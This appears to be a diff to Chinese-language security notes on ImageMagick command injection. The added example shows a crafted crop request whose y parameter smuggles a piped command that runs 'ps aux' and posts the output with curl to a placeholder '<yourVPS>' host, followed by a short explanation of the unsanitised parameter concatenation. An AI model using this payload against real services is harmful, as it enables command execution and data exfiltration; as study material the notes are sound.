@@ -35,3 +35,7 @@ ImageMagick组件
 + 漏洞利用
     - 命令拼接：上传的数据包传递了ImageMagick处理图片的参数，用户可控，直接用拼接符拼接命令。
     - 处理包含恶意元数据的图片：攻击者可以上传包含恶意元数据的图片文件，当ImageMagick处理该图片时，恶意代码将被执行。
++ 示例
+    - 原始请求： ``http://your-account.com/edit/process?imageId=...&a=crop&x=0&y=0&w=700&h=746&random=...``
+    - 恶意请求： ``http://your-account.com/edit/process?imageId=...&a=crop&x=0&y=0%20-write%20|ps${IFS}aux|curl${IFS}http://<yourVPS>{IFS}-d${IFS}@-&w=700&h=746&random=...``
+    - 漏洞原理：ImageMagick处理图片剪裁的命令行工具（ **convert** ， **crop**）直接将用户可控的x、y、w、h等参数直接拼接到了命令中。
